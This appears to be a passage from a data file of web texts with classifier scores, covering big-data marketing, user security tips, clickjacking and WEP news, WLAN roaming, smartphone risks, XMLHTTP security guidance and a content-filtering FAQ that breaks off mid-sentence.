feed it into the system electronically, can identify fraud faster and more accurately.\" Many organizations are concerned that the amount of amassed data is becoming so large that it is difficult to find the most valuable pieces of information. - What if your data volume gets so large and varied you don't know how to deal with it? - Do you store all your data? - Do you analyze it all? - How can you find out which data points are really important? - How can you use it to your best advantage? Until recently, organizations have been limited to using subsets of their data, or they were constrained to simplistic analyses because the sheer volumes of data overwhelmed their processing platforms. What is the point of collecting and storing terabytes of data if you can't analyze it in full context, or if you have to wait hours or days to get results? On the other hand, not all business questions are better answered by bigger data. You now have two choices: - Incorporate massive data volumes in analysis. If the answers you are seeking will be better provided by analyzing all of your data, go for it. The game-changing technologies that extract true value from big data – all of it – are here today. One approach is to apply high-performance analytics to analyze the massive amounts of data using technologies such as grid computing, in-database processing and in-memory analytics. - Determine upfront which big data is relevant. Traditionally, the trend has been to store everything (some call it data hoarding) and only when you query the data do you discover what is relevant. We now have the ability to apply analytics on the front end to determine data relevance based on context. This analysis can be used to determine which data should be included in analytical processes and which can be placed in low-cost storage for later availability if needed. \" Now you can run hundreds and thousands of models at the product level – at the SKU level – because you have the big data and analytics to support those models at that level.\" A number of recent technology advancements are enabling organizations to make the most of big data and big data analytics: - Cheap, abundant storage and server processing capacity. - Faster processors. - Affordable large-memory capabilities, such as Hadoop. - New storage and processing technologies designed specifically for large data volumes, including unstructured data. - Parallel processing, clustering, MPP, virtualization, large grid environments, high connectivity and high throughputs. - Cloud computing and other flexible resource allocation arrangements. Big data technologies not only support the ability to collect large amounts of data, they provide the ability to understand it and take advantage of its value. The goal of all organizations with access to large data collections should be to harness the most relevant data and use it for optimized decision making. It is very important to understand that not all of your data will be relevant or useful. But how can you find the data points that matter most? It is a problem that is widely acknowledged. \"Most businesses have made slow progress in extracting value from big data. And some companies attempt to use traditional data management practices on big data, only to learn that the old rules no longer apply,\" says Dan Briody, in the 2011 Economist Intelligence Unit's publication, \"Big Data: Harnessing a Game-Changing Asset.\" Big data solutions from SAS How can you make the most of all that data, now and in the future? It is a twofold proposition. You can only optimize your success if you weave analytics into your big data solution. But you also need analytics to help you manage the big data itself. There are several key technologies that can help you get a handle on your big data, and more important, extract meaningful value from it. - Information management for big data. Many vendors look at big data as a discussion related to technologies such as Hadoop, NoSQL, etc. SAS takes a more comprehensive data management/data governance approach by providing a strategy and solutions that allow big data to be managed and used more effectively. - High-performance analytics. By taking advantage of the latest parallel processing power, high-performance analytics lets you do things you never thought possible because the data volumes were just too large. - High-performance visual analytics. High-performance visual analytics lets you explore huge volumes of data in mere seconds so you can quickly identify opportunities for further analysis. Because it's not just that you have big data, it's the decisions you make with the data that will create organizational gains. - Flexible deployment options for big data. Flexible deployment models bring choice. High-performance analytics from SAS can analyze billions of variables, and those solutions can be deployed in the cloud (with SAS or another provider), on a dedicated high-performance analytics appliance or within your existing IT infrastructure, whichever best suits your organization's requirements. 1 Source: IDC. \"Big Data Analytics: Future Architectures, Skills and Roadmaps for the CIO,\" September 2011. 2 Source: American Bankers Association, March 2009 3 Source: http://www.economist.com 4 Source: http://blog.twitter.com 5 Source: http://newsroom.fb.com/",
        "prob": "tensor([[0.0041, 0.9959]])"
    },
    {
        "text": "SEAS Information Security Tips You may feel like \"nothing I have on my computer is worth protecting, and they wouldn't bother with me anyway.\" But the truth is that a vulnerable computer can be the starting point for other attacks on our network. A hacker may not be interested in your computer specifically but rather may hijack your computer for use in remote proxy attacks such as a Distributed Denial of Service (DDoS), thereby becoming a threat to someone else's computer. Most attacks come from automated cracking programs which simply try to break into every machine on the Internet. When they break into one computer, they copy themselves to that machine so that it can try to break into yet more machines. So no one is choosing to break into your machine specifically, but your machine needs to be secure for the welfare of other computers on the network. Below are some basic concepts and practices that will not only protect you and your data, but the whole Penn computing community. As an Eniac user, you are required to keep your account secure to protect the entire system. 1. Don't open email attachments, unless you are expecting them. Don't send email attachments using any of the extensions listed in the Answers article on Prohibited Attachments, they will be interpreted as viruses and blocked. Email containing these types of attachments is automatically deleted and there is no way to recover it. 2. Lock your computer when you are away from your desk in the office, lab, or college house, even just for a minute. To lock a Windows machine, press ctrl-alt-delete and click the \"Lock Computer\" button. 3. Don't share your password with anyone. If you have a shared account, use a different password for it. Also, don't use the same password on different sites. For example, don't use the same password for your bank account and for your email. Don't write your passwords down. The best place to keep your passwords is in your head. 4. Install and run Antivirus software and keep it up-to-date. Penn provides site-licensed copies of Symantec AntiVirus to Penn users at no cost. Visit http://www.upenn.edu/computing/virus/ to download a copy. Once it's installed, be sure to run \"LiveUpdate\" to get the latest virus signature files on a regular basis. You can set up LiveUpdate to automatically go out and get updates (see directions below) To automate Symantec LiveUpdates: Right-click on the Symantec shield icon in the lower right corner of the display and select \"Open Symantec Antivirus\". Select Schedule Updates from the File pull-down menu. Put a check in the box next to \"Enable scheduled automatic updates\". Click the Schedule button. Under Frequency, click the button next to Daily. Select a convenient time for the updates to take place. Click OK. 5. Keep your operating system patches up-to-date. It's recommended to run Windows Update regularly. 6. Don't let anyone modify your account or your computer, unless you trust them. 7. Make sure your system security settings are correct. Download and run Microsoft Baseline Security Analyzer. Microsoft released this as a response to the Code Red and Nimda worms a few years ago. It's designed to identify common security misconfigurations. 8. Remove bad software - don't install spyware, peer-to-peer software, or \"toolbars\". Run Spybot Search and Destroy daily to detect and remove spyware. Update it weekly. (http://download.com.com/3000-8022-10122137.html) 9. If someone gets a message with your address in the \"From\" line, this doesn't mean your account was broken into. Similarly, just because you get a bounced message from a message you never sent, doesn't mean your account was broken into. Delete these messages, they are spam. 10. Run the \"Shields Up\" scan, an Internet security vulnerability profiling free service. This scan will identify exposed areas on your computer that intruders could use to probe and hack into. Open ports make it easy for intruders to steal your personal information, credit card numbers, and so forth through your computer's insecure connection to the Internet. Do what you can to fix the security problems the \"Shields Up\" scan reports. There is a lot of helpful information on the site. Go to \"Shields Up\" Scan 11. Install a firewall on your computer. CETS technicians will install and set up a firewall on SEAS staff and faculty computers located in SEAS offices. Other Related Links If you have any questions about computer security, please send mail to firstname.lastname@example.org. Please be as detailed as possible.",
        "prob": "tensor([[2.0465e-06, 1.0000e+00]])"
    },
    {
        "text": ", SecurityFocus 2008-09-30 What's the harm in clicking on a button? That's the central question being discussed by security professionals following the cancellation of a presentation on user-interface overlays -- or \"clickjacking\" as some have dubbed the threat -- at last week's Open Web Application Security Project (OWASP) AppSec conference in New York City. On Friday, the U.S. Computer Emergency Readiness Team (US-CERT) warned network administrators to beware of the technique. \"Clickjacking gives an attacker the ability to trick a user into clicking on something only barely or momentarily noticeable,\" the group stated. \"Therefore, if a user clicks on a web page, they may actually be clicking on content from another page.\" Two researchers, Robert Hansen and Jeremiah Grossman, planned at AppSec to discuss the threat of using Web graphics to persuade a victim to click where an attacker wants on a page. The technique, which is also known as well as user-interface (UI) redressing and IFRAME overlay, can be used by an attacker to hide a button or link on a legitimate page, such as a bank's account page or Web mail application, using other Web content to mask the page's context. A Web user might think, for example, that they are clicking on a button to close a dialog box, when the button press in reality deletes all their e-mail messages in Gmail. Or, a user might believe they are clicking on a button to decline to take a survey, when they are actually transferring money from their bank. The technique could be used to raise an article's Digg score or get paid for a pay-for-click advertisement, said Grossman, the chief technology officer for Web security firm White Hat Security. \"The list is virtually endless and these are the more relatively harmless examples,\" he told SecurityFocus in an e-mail interview. \"Next consider that an attack can invisibly hover these buttons below the users mouse, so that when the clicks on something the visually see, they actually are clicking on something the attacker wants them to. Now, what could the bad guy potentially do with that ability? The more we researched, the worse the exploits become.\" Hansen and Grossman canceled their presentation after demonstrating to software maker Adobe that one of its products could be affected by the attack. \"While they saw this issue as primarily a web browser issue, they showed us that one of their demos included an Adobe product,\" David Lenoe, a program manager for Adobe's Product Security Incident Response Team (PSIRT), said in a blog post. \"We worked together with Robert and Jeremiah to assess the impact of this issue, and they determined that it was in our customers best interest to refrain from making this issue public until Adobe and web browser vendors have a chance to provide a fix or fixes to our mutual customers.\"",
        "prob": "tensor([[2.0979e-06, 1.0000e+00]])"
    },
    {
        "text": "PC virus celebrates 20th birthday Many unhappy returns Analysis Today, 19 January is the 20th anniversary for the appearance of the first PC virus. Brain, a boot sector virus, was let loose in January 1986. Brain spread via infected floppy disks and was a relatively innocuous nuisance in contrast with modern Trojan, rootkits and other malware. The appearance of the first Windows malware nonetheless set in train a chain of events that led up to today's computer virus landscape. Boot sector viruses ceased to appear when floppy discs went out of fashion but they continued to be a nuisance between 1986 to 1995, when internet technology started to penetrate the consumer market. These types of viruses relied on people to exchange infected discs and virus outbreaks often took months to spread. The creation of macro viruses, which exploited security weaknesses in Microsoft word and other applications, meant that malware outbreaks peaked after days instead of weeks and months. Macro viruses ruled the roost for around four years between 1995 and 1999 before email became the main vector for viral distribution. Harnessing the internet meant that the time it took the first email worms, such as the Love Bug, to spread dropped from days to hours. Email worms such as the Love Bug and Melissa caused widespread disruption and confusion in 1999 before they were brought to heel. By 2001, network worms such as Blaster were created that automatically and indiscriminately infected Windows PCs without adequate protection. Email and network worms remain a problem today but the greatest problem these days is posed by key-logging Trojans designed to snoop on user's private information, such as online account details, and the many strains of malware that turn infected PCs into zombie drones under the control of hackers. The biggest change over the last 20 years has been in the motives of virus writers rather than in the types of malware they've cooked up, according to anti-virus firm F-Secure. \"The most significant change has been the evolution of virus writing hobbyists into criminally operated gangs bent on financial gain,\" said F-Secure's chief research officer Mikko Hypponen. “This trend is showing no signs of stopping.\" \"There are already indications that malware authors will target laptop WLANs as the next vector for automatically spreading worms,\" he added. ®",
        "prob": "tensor([[2.0869e-06, 1.0000e+00]])"
    },
    {
        "text": "WLAN Roaming - the basics Even if you keep the same IP address, things get complicated. When a WLAN client moves from the range of one Access Point (AP) to another in the same subnet, it needs to find the best AP, decide when to roam onto it, associate with it and do any authentication required, as per your security policies. Then the wired network has to relearn the location of the client, so that data can be sent to it. All of this takes time and this is without the client having to worry about getting a new IP address! The scanning and decision making part of the roaming process (see How to Make your WLAN roam faster) allows the client to find a new AP on an appropriate channel as the user moves. When this happens, the client must associate with the new AP. It must then, assuming that it is an 802.1x supplicant (see The EAP Heap), reauthenticate with the RADIUS server. This is transparent to the user - but the delay in this happening may not be. It can take up to a second for association and authentication to occur (see below for implications and solutions). IAPP The next part of the process is for the rest of the network to be made aware that the client has shifted. This calls for AP to AP communication, which was never catered for in the original 802.11 spec. Vendors had their own way of passing updates; however 802.11f, the Inter-Access Point Protocol, has now been now published by the IEEE as a trial-use standard - it sits in this state for two years before being submitted as a full-use standard - to facilitate multi-vendor AP interoperability. IAPP calls for the new servicing AP to send out two packets onto the wired LAN. One of these is actually set with the source address of the client (the standard says this should be a broadcast, however some implementations still use unicast to the previous AP or a multicast) and is used by intervening switches to update their MAC address tables with the client’s new location. The other is an IAPP ADD-notify packet from the new AP to an IAPP multicast address that all APs subscribe to, which contains the MAC address of the station it has just associated. All APs will receive this packet, and the one that had been associated with that station will use the sequence number included to determine that this is newer information and remove the stale association from its internal table. IAPP provides for the sharing of information between APs. The format of this information is specified, as \"contexts\" but the actual content is not defined, so it’s not yet hugely useful as far as vendor interoperability is concerned. Also IAPP has no specific provision for security. Who Cares? So, worst case, you’re probably looking at about one second where your client can’t be reached over the network. For a lot of clients and applications, this isn’t an issue. If you’re walking from one room to another carrying your laptop, and you want to use email or a web browser, it’s not a problem. In fact, most TCP-based applications will be able to handle this sort of hiccup (remember that in this instance there’s no address change). UDP applications are less able to handle interruptions, and unfortunately, these are the ones where a break would be most noticed by the user. The killer? Voice. Not only is VoWLAN UDP-based for the bearer traffic, but it’s also the one application where you are likely to be using it as you move between APs. And you are definitely going to notice a one second hit. Which is presumably why the vendors that are pushing fast roaming for 802.11 are the ones squarely behind the use of wireless handsets in an IP Telephony environment, such as Cisco, SpectraLink and Symbol. Related standards In fact these are three of the companies behind the drive for a new IEEE Working Group to create a standard to handle faster Layer 2 roaming. There are several related standards and works-in-progress, but none that actually cover this specific aspect: - As already discussed, IAPP—802.11f—isn’t designed for speed. - 802.11i, the security standard (not yet ratified) has provision for secure fast handoff, but it’s too security specific for this requirement. - 802.11k—Radio Resource Management—might help in that it should cater for faster discovery of APs. Again, not yet finalised. - 802.21 isn’t specifically for wireless LANs at all. It’s aimed at the handoff between heterogeneous networks (wired, 802.11, Bluetooth) and while it will deal with inter-ESS roaming (ie subnet to subnet in a WLAN), it won’t speed up the Layer 2 process which is needed prior to any Layer 3 interaction. This was the P802 Handoff Study Group, and is just in the process of kicking off now. In the meantime of course, there are proprietary solutions. The two parts that need to be speeded up to cut down outage times are the scanning process (to allow clients to find new suitable APs to associate to), and, specifically for security, a faster way of reauthenicating to cut out the RADIUS request/response process. There are things that can be done to speed up the time it takes for a client to find another suitable AP. An AP can maintain information on its adjacent APs, which it can pass to a client on request—this will give the client a better indication of usable channels to scan, for example. The biggest time saver, however, is reckoned to be in localising the 802.1x authentication process. Cisco has incorporated Fast Secure Roaming into its Wireless Domain Services (WDS) portfolio as part of its Structured Wireless Aware Networking offering, which in effect allows an AP on each local subnet to act as the authenticator for clients. When a client (or other AP) goes through the initial RADIUS authentication, it does it via one AP running WDS. This lets that AP establish shared keys between itself and every other entity in the L2 domain, and allows for quicker reauthentication. Plans are for this capability to be included in Cisco’s router/switch platforms later this year as part of its SWAN development. Symbol provides similar functionality in its hardware, while Airespace) also caters for fast roaming in its wireless switches and appliances, and companies such as Bluesocket, which use gateways to control pretty dumb APs, manage everything centrally. Proxim handles things differently, pre-authenticating clients to nearby APs as well as the one currently in use in preparation for the client moving. So before you get excited about Layer 3 roaming, make sure you understand how your vendor of choice implements it at Layer 2. If that bit’s not fast enough to stop you losing traffic, you’ll never be able to move across subnets. It’s likely to be years before there’s a usable standard in place and in the meantime while you can probably get APs from different vendors to work together, there’s no guarantee of interoperability if you want to turn on their various fast roaming options.",
        "prob": "tensor([[0.0064, 0.9936]])"
    },
    {
        "text": "COMMON RISKS FOR SMARTPHONES We usually do a good job of protecting our computers, but what about smartphones? Careless use can open up users to a lot of risks. Take a moment to consider each of these areas: Loss of device and information theft. Smartphones are small and can easily be lost or stolen. Unauthorized users may access your accounts, address lists, photos, and more to scam, harm, or embarrass you or your friends. They may leverage stored passwords to access your bank and credit card accounts, steal your money, or make credit card charges. They may also gain access to sensitive material. Social engineering. A common mobile threat is social engineering. Whether via text message, image, or application (app) to download, an incoming communication may be an attempt to gain access to your information. A current example consists of a text message that comes from an unknown number telling you that if you click on the link provided, you will have access to thousands of free ringtones. If this sounds too good to be true, that is because it is. The link is a malicious link. Clicking on it will compromise the security of your smartphone. TMI (too much information). Guidelines for protecting privacy, safety, and reputation when sharing via computers also apply when sharing via smartphones. Public Wi-Fi. Smartphones are susceptible to malware and hacking when leveraging unsecured public networks. Bluetooth® and near field communications (NFC). Bluetooth is a wireless network technology that uses short-wave radio transmissions to transmit voice and data. NFC allows for smartphones to communicate with each other by simply touching (“bumping”) another smartphone, or being in close proximity to another smartphone with NFC capabilities or an NFC device. Risks with using NFC and Bluetooth include eavesdropping, through which the cybercriminal can intercept your personal data. NFC also has the risk of transferring viruses or other malware from one NFC-enabled device to another. SIMPLE STEPS TO PROTECT YOUR SMARTPHONE Update the operating system. Smartphones are computing devices that need to be updated. Updates often provide you with enhanced functionality and enriched features, as well as fixes to critical security vulnerabilities. Your smartphone manufacturer should notify you whenever an update is available. Use of security software is a must. As the smartphone market is increasing, so too is the amount of malware designed to attack smartphones. The software security solutions that are available for desktops and laptops are not as widely available for smartphones. A key protection is to use mobile security software and keep it up to date. Many of these programs can also locate a missing or stolen smartphone, back up your data, and even remotely wipe all data from the smartphone if it is reported stolen. Password-protect your device. Enable strong password protection on your device and include a timeout that requires authentication after a period of inactivity. Secure the smartphone with a unique password – not the default one it came with. Do not share your password with others. Think before you click, download, forward, or open. Before responding, registering, downloading, or providing information, get the facts. No matter how tempting the text, image, or application is, if the download is not from a legitimate app store or the site of a trusted company, do not engage with the message. Be cautious with public Wi-Fi. Many smartphone users use free Wi-Fi hotspots to access data and keep their smartphone plan costs down. There are numerous threats associated with Wi-Fi hotspots. To be safe, avoid logging into accounts, especially financial accounts, when using public wireless networks. Disable Bluetooth and NFC capabilities when not in use. Capabilities such as Bluetooth and NFC can provide ease and convenience in using your smartphone. They can also provide an easy way for a nearby, unauthorized user to gain access to your data. Turn these features off when they are not required. Enable encryption. Enabling encryption on your smartphone is one of the best ways to safeguard information stored on the device, thwarting unauthorized access. Securely dispose of your device. With the constant changes and upgrades in the smartphone market, many are upgrading their devices on a regular basis. It is important that you wipe the information from your smartphone before disposal. Additionally, make sure any secure digital (SD) cards are removed and erased. If you are not redeploying the subscriber identity module (SIM) card to another device, then make sure your personal information stored on the SIM card is erased or destroyed. For additional information, please consult these resources: About.com – 14 Ways to Find a Stolen or Lost iPhone: http://ipod.about.com/od/iphonetroubleshooting/tp/14-Ways-To-Find-A-Lost-Or-Stolen-Iphone.htm FTC – How to Dispose Your Mobile Device Securely: University of Northern Colorado: US-CERT – Cyber Threats to Mobile Phones: Sophos – Android Tool: Microsoft – Secure Your Smartphone: Our web site provides links to other web sites for convenience and informational purposes only. By accessing these links you will be leaving First Farmers State Bank's website and entering a website hosted by another party. Please be advised that you will no longer be subject to, or under the protection of, the privacy policies of First Farmers State Bank's website. We encourage you to read and evaluate the privacy policies on the site you are entering.",
        "prob": "tensor([[2.0871e-06, 1.0000e+00]])"
    },
    {
        "text": "Helper API Security This topic describes security issues associated with XMLHTTP and ServerXMLHTTP. In addition, it provides some guidance for mitigating security exposure. The following sections provide information about Helper API security, with an emphasis on XMLHTTP. Use XMLHTTP Only on the Client XMLHTTP should only be used on the client. Because XMLHTTP is marked safe for scripting, you call XMLHTTP from a script that is executed in the client-side Internet browser. Remember, you can use XMLHTTP and ServerXMLHTTP in any arbitrary script, inside or outside the browser. XMLHTTP is not safe for server-side implementation. Using XMLHTTP on the server means that you would use XMLHTTP via JScript, VBScript, C++, ASP, or ASP.NET. XMLHTTP is not thread-safe - it doesn't work for multi-threaded scenarios. If you use XMLHTTP, you will not receive an error, but your script may not perform properly. If you need XMLHTTP functionality on the server, you should use ServerXMLHTTP, not XMLHTTP. XMLHTTP Uses Cached Credentials XMLHTTP uses cached credentials if the user does not provide new credentials for every open method call in scenarios where specific credentials are used. Kiosk-style applications using XMLHTTP for multiple users that share a single login should always ensure that they terminate the Internet Explorer process when a user finishes a session. Furthermore, kiosk-style applications should never display the address bar as part of the application. Set the Site Object to Prevent Cross-Site and Cross-Domain Attacks When using XMLHTTP outside of Internet Explorer, it is important to set the Site object to prevent cross-site and cross-domain access on calls to the open Method (IXMLHTTPRequest). If the Site object is set, on redirects the redirect target is automatically checked against the initial Open request, and the standard cross-zone and cross-domain checks are applied. In Internet Explorer scripting scenarios, the Site is set by Internet Explorer. Validate the URL Before Calling Open in XMLHTTP You should not accept untrusted data to construct a URL when calling the Open method. You should validate the data first, making sure that the user is allowed to enter only approved addresses. This is particularly important in scenarios outside of Internet Explorer when the Site object is not set, where it is up to you to prevent cross-domain and cross-site attacks. Spoofing and Best-Fit Character Attacks In spoofing attacks, an attacker attempts to craft information that dupes software to accept the information, such as an HTTP request, as coming from a trusted third party. One approach is for the attacker to construct a URL, perhaps using escaped characters, so that it looks like a URL to a trusted site, when in fact it is a URL to a site that has been set up with malicious intent. Another method is to use best-fit character attacks, where higher order characters in a string resource are mapped to lower order characters by certain programming interfaces, either by accident or deliberately. For example, an attacker might submit a URL to a site micrõsoft.com, with the intent that it be interpreted as microsoft.com. Both types of attacks might be used by an attacker to dupe host identity, probe for string processing vulnerabilities in a system, or as part of a phishing attack. A phishing attack is one where an attacker pretends to be from a trusted source. Typically, it involves an attempt to fool the user into entering user names, passwords, and other private information. XMLHTTP and ServerXMLHTTP do not validate string input, including the HTTP Verb and URL, submitted in the Open() method call. If your application completely controls the URLs which are passed to XMLHTTP or ServerXMLHTTP methods, including request headers and query string, you might not be vulnerable to this class of attacks. You are vulnerable if you permit URLs or portions of URLs from an untrusted source, including user input. The ServerXMLHTTP and XMLHTTP components follow strict rules to permit or deny redirects. Note that the general behaviors described below might change with Internet Explorer or Windows security settings. The principle rules are the following: For ServerXMLHTTP, there is no zone redirect checking when in asynchronous mode. To mitigate Redirect-based DoS attacks, XMLHTTP and ServerXMLHTTP components implement redirect limits. Redirects are typically permitted from zones of greater security to zones of equal and lesser security. For example, a redirect from a resource in the Intranet zone to Internet zone should succeed. Redirects are not permitted from zones of lesser security to zones of greater security. For example, a redirect from a resource in the Internet zone to the My Computer zone should fail. Redirects are not permitted across networking protocols. Redirects are not permitted across network domains. Strictness in MSXML 6.0 May Prevent Some Applications from Working IE defines five zones - MyComputer, Trusted Sites, Local intranet, Internet, and Restricted Sites. There are a number of rules regarding how a site in one zone can reference a site in another zone. For example, a site on the Internet can't reference a document on the Local intranet. In IE, and for applications that set the site explicitly, MSXML 6.0 is strict about URL redirection, and may prevent some user scenarios. In order to work around the security restrictions, the user can add the machine doing the redirection to the list of trusted sites on the machine where the redirection is taking place. Error Messages May Reveal Data The description of an error may reveal data. Error messages should not be exposed to callers that are not trusted. You should catch all errors and report errors with your own custom error messages. The following sections provide information specific to ServerXMLHTTP. Use ServerXMLHTTP Only on the Server ServerXMLHTTP should not be hosted in the browser; it is not marked safe for scripting. Use HTTPS to Provide Encryption for Sensitive Data ServerXMLHTTP does not provide any encryption by default. You should use HTTPS connections to encrypt sensitive data during transmission. Response Packages Are Insecure Response packages are generally not secure (responseXML Property (ServerXMLHTTP/IServerXMLHTTPRequest), responseBody Property (ServerXMLHTTPRequest/IServerXMLHTTPRequest), and responseText Property (ServerXMLHTTP/IServerXMLHTTPRequest)). ServerXMLHTTP is used to retrieve information from other sites on the internet. When you retrieve data using it, you should know that the source of your information is trustworthy. Further, after using a response package, you should check for malicious data (both size and content). The ServerXMLHTTP object does not check for denial of service threats or bad data returned from response packages. ServerXMLHTTP should not be used to load untrusted XML in applications where denial of service is a concern. No Secure-Base-URL Checking for Redirects ServerXMLHTTP does not provide secure-base-URL checking for redirects. You should be aware that, when accessing untrusted locations with MSXML 6.0 ServerXMLHTTP or MSXML 3.0 ServerXMLHTTP in asynchronous mode, there are no checks on redirects. There are checks on the initial Open (both for the Open call and for any external references within the instance). Spoofing and Best-Fit Character Attacks ServerXMLHTTP is vulnerable to both spoofing attacks and best-fit character attacks. For more details, see the discussion under XMLHTTP, earlier in this topic.",
        "prob": "tensor([[0.0114, 0.9886]])"
    },
    {
        "text": "WEP is the encryption standard that comes with WiFi LANs. It uses RC4 encryption, which is the same as that used by the security built into standard web browsers (SSL). One might think, therefore, that it is sufficiently tried and tested to be trusted. Well, there's not a great deal wrong with RC4 -- but there is a great deal wrong with its implementation within WiFi. Put simply, it should not be used in this manner. (Technically, it is a stream cipher being used where a stream cipher should not be used. A block cipher would have been better for WLANs. But RC4 was easy and cheap to implement - and with 40 bit keys it was not subject to the then existent US export laws.) Problems with WEP were known at the end of year 2000. But in summer 2001, the well-known cryptographers Fluhrer, Mantin and Shamir (the 'S' of RSA) published a new paper in which “we show that RC4 is completely insecure in a common mode of operation which is used in the widely deployed Wired Equivalent Privacy protocol (WEP, which is part of the 802.11 standard), in which a fixed secret key is concatenated with known IV modifiers in order to encrypt different messages. Our new passive ciphertext-only attack on this mode can recover an arbitrarily long key in a negligible amount of time...” In simple English, this is devastating news for the security of 802.11 WLANs. Basically, there is no security. It prompted Phil Belanger, past chairman and current marketing director of WECA, to comment: “We perceive this as serious and different from the previous attacks, and we're not going to say 'Don't worry about it'. However, we've always said that if privacy is a concern, you need to be using end-to-end security mechanisms, like virtual private networks, along with the WLAN.” Without going into the technical details, RC4's implementation within WiFi means that in cryptographic terms it is a trivial matter to break the encryption. To make matters worse, there is a freely available hacking tool on the Internet (AirSnort) that can do all the hard work automatically. As a result, wireless LANs using WEP encryption are as vulnerable to script kiddies (wannabee hackers without their technical expertise) as they are to genuine hackers. But of course the real problem isn't limited to traffic on the WLAN. Once a wireless terminal is compromised, the hacker has effectively bypassed any firewall and gained access to the entire corporate wired LAN.",
        "prob": "tensor([[1.4483e-04, 9.9986e-01]])"
    },
    {
        "text": "Additions, clarifications, and corrections regarding the content of this document will be most graciously accepted: please send email to firstname.lastname@example.org. Rating: Value judgments are used to categorize web sites based on their content. These ratings could use simple allowed/disallowed distinctions like those found in programs like CyberSitter or NetNanny, or they can have many values, as seen in ratings systems based on Platform for Internet Content Selection (PICS, see question 3.0). Filtering: With each request for information, the filtering software examines the resource that the user has requested. If the resource is on the \"not allowed\" list, or if it does not have the proper PICS rating, the filtering software tells the user that access has been denied and the browser does not display the contents of the web site. The first content filters were stand-alone systems consisting of mechanisms for determining which sites should be blocked, along with software to do the filtering, all provided by a single vendor. The other type of content filter is protocol-based. These systems consist of software that uses established standards for communicating ratings information across the Internet. Unlike stand-alone systems, protocol-based systems do not contain any information regarding which sites (or types of sites) should be blocked. Protocol-based systems simply know how to find this information on the Internet, and how to interpret it. Filters and ratings systems are seen as tools that would provide the cyberspace equivalent of the physical separations that are used to limit access to \"adult\" materials. In rating a site as objectionable, and refusing to display it on the user's computer screen, filters and ratings systems can be used to prevent children from seeing material that their parents find objectionable. In preventing access, the software acts as an automated version of the convenience-store clerk who refuses to sell adult magazines to high-school students. Filters are also used by businesses to prevent employees from accessing Internet resources that are either not work related or otherwise deemed inappropriate. Whether used in homes or workplaces, these tools raise serious privacy concerns. List-based blocking works by explicitly enumerating sites that should either be blocked or allowed. These lists are generally provided by filter vendors, who search for sites that meet criteria for being classified as either \"objectionable\" or \"family-friendly\". Filtering software vendors vary greatly in the amount of information and control they make available to users. Most vendors do not allow users to see the actual list of blocked sites, as it is considered to be a kind of trade secret. However, some vendors provide detailed descriptions of the criteria used to determine which sites should be blocked. Some vendors might allow users to add sites to the list, either in their own software or by sending sites to the vendor for review. Stand-alone filtering tools also vary in the extent to which they can be configured by users. Some software packages allow users to make selections from a list of the categories they would like blocked. For example, a parent may wish to block explicit sex but not discussions of homosexuality as a life-style. Others might allow users to choose from a range of choices in any given topic area. For example, instead of simply blocking all nudity, these tools might allow users to chose to allow partial nudity while blocking full nudity. Keyword-based blocking uses text searches to categorize sites. If a site contains objectionable words or phrases, it will be blocked. First, these lists are incomplete. Due to the decentralized nature of the Internet, it's practically impossible to definitively search all Internet sites for \"objectionable\" material. Even with a paid staff searching for sites to block, software vendors cannot hope to identify all sites that meet their blocking criteria. Furthermore, since new web sites are constantly appearing, even regular updates from the software vendor will not block out all adult web sites. Each updated list will be obsolete as soon as it is released, as any as any site that appears after the update will not be on the list, and will not be blocked. The volatility of individual sites is yet another potential cause of trouble. Adult material might be added to (or removed from) a site soon after the site is added to (or removed from) a list of blocked sites. Blocking lists also raise problems by withholding information from users, who may or may not have access to information describing the criteria used to block web sites. While some vendors provide descriptions of their blocking criteria, this information is often vague or incomplete. Several vendors have extended blocking beyond merely \"objectionable\" materials. In some instances, political sites and sites that criticize blocking software have been blocked. This obscurity is compounded by practices used to protect these lists of blocked sites. Vendors often consider these lists to be proprietary intellectual property, which they protect through mathematical encryption, which renders the lists incomprehensible to end users. As a result, users are unable to examine which sites are blocked and why. This arbitrary behavior demeans the user's role as an active, thoughtful participant in their use of the Internet. Keyword searches cannot use contextual information. While searches can identify the presence of certain words in a text, they cannot evaluate the context in which those words are used. For example, a search might find the word \"breast\" on a web page, but it cannot determine whether that word was used in a chicken recipe, an erotic story, or in some other manner. In one notable incident, America Online's keyword searches blocked a breast cancer support group. Keyword searches cannot interpret graphics. It is not currently possible to \"search\" the contents of a picture. Therefore, a page containing sexually explicit pictures will be blocked only if the text on that page contains one or more words from the list of words to be blocked. The Massachusetts Institute of Technology's World Wide Web Consortium has developed a set of technical standards called PICS (Platform for Internet Content Selection) so that people can electronically distribute descriptions of digital works in a simple, computer-readable form. Computers can process these labels in the background, automatically shielding users from undesirable material or directing their attention to sites of particular interest. The original impetus for PICS was to allow parents and teachers to screen materials they felt were inappropriate for children using the Net. Rather than censoring what is distributed, as the Communications Decency Act and other legislative initiatives have tried to do, PICS enables users to control what they receive.There are two components involved in the practical use of PICS: ratings systems, and software that uses ratings systems to filter content. PICS-based software uses an alternative approach based on distributed sharing of ratings information. Instead of using blocking lists or keyword searches, programs that use PICS use standardized \"ratings systems\" to determine which sites should be blocked. Available from software vendors or from Internet sites, these ratings systems are be used to describe the content of Internet sites (see question 3.7 for a description of how PICS works in practice). Users of PICS-based software are usually given the ability to choose which ratings system they would like to use. As an open standard, PICS can be used for a wide range of applications. In addition to providing a means for blocking content deemed unsuitable for children, PICS might also be used for describing content in terms of its educational content, potential for violations of privacy, or any other criteria that involve rating of Internet sites. In some senses, programs that use PICS are much more flexible than stand-alone filtering software. Users of PICS software are not tied to the judgments of the software vendor, and the descriptions of the criteria used by the ratings systems are publicly available. However, users are currently limited to choosing between a small number of ratings systems, each of which has its own biases and viewpoints. Users that disagree with the popular ratings systems may be unable to use PICS in a manner that fits their needs and viewpoints. A rating is a description of some particular Internet content, using the terms and vocabulary of some ratings system. Self-Rating: Web site publishers can evaluate their own content and put PICS rating information directly into their web pages. Currently, this evaluation can be done through Web pages provided by developers of the major ratings services. Third-Party Ratings: Interested third parties can use PICS ratings systems to evaluate web sites and publish their own ratings for these sites. Educational groups, religious groups, or individuals can rate sites and publish these ratings on the Internet for users to access. Your browser software may influence choice of ratings service. If you use Microsoft's Internet Explorer, you only have one choice (RSACi) built in to the initial distribution. To use other ratings services, IE users must download files from the 'Net and install them on their PCs. Currently (as of September 1997), there are three PICS services that are being widely used or promoted: RSACi: Sponsored by the Recreational Software Advisory Council (known for ratings on video games), RSACi is probably the most widely used PICS ratings system in use today. RSACi's ratings categories include violence, nudity, sex, and language, with 5 ratings within each category. As of September 1997, RSACi claims to have over 43,000 sites rated. SafeSurf: Developed by the SafeSurf corporation, this system's categories include \"Age 